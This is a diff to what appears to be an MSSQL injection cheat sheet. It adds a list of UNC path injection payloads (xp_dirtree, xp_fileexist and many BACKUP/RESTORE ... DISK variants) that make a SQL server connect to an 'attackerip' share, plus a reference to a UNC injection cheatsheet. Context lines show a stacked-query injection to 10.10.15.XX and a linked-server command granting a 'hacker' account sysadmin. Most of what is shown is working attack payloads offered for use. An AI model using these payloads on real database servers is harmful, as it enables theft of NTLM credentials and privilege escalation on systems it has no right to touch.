@@ -208,6 +208,21 @@ MSSQL supports stacked queries so we can create a variable pointing to our IP ad
 1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';-- 
 ```
 
+```sql
+xp_dirtree '\\attackerip\file'
+xp_fileexist '\\attackerip\file'
+BACKUP LOG [TESTING] TO DISK = '\\attackerip\file'
+BACKUP DATABASE [TESTING] TO DISK = '\\attackeri\file'
+RESTORE LOG [TESTING] FROM DISK = '\\attackerip\file'
+RESTORE DATABASE [TESTING] FROM DISK = '\\attackerip\file'
+RESTORE HEADERONLY FROM DISK = '\\attackerip\file'
+RESTORE FILELISTONLY FROM DISK = '\\attackerip\file'
+RESTORE LABELONLY FROM DISK = '\\attackerip\file'
+RESTORE REWINDONLY FROM DISK = '\\attackerip\file'
+RESTORE VERIFYONLY FROM DISK = '\\attackerip\file'
+```
+
+
 ## MSSQL Make user DBA (DB admin)
 
 ```sql
@@ -252,3 +267,4 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 * [MSSQL Trusted Links - HackTricks.xyz](https://book.hacktricks.xyz/windows/active-directory-methodology/mssql-trusted-links)
 * [SQL Server – Link… Link… Link… and Shell: How to Hack Database Links in SQL Server! - Antti Rantasaari - June 6th, 2013](https://blog.netspi.com/how-to-hack-database-links-in-sql-server/)
 * [DAFT: Database Audit Framework & Toolkit - NetSPI](https://github.com/NetSPI/DAFT)
+* [SQL Server UNC Path Injection Cheatsheet - nullbind](https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e)
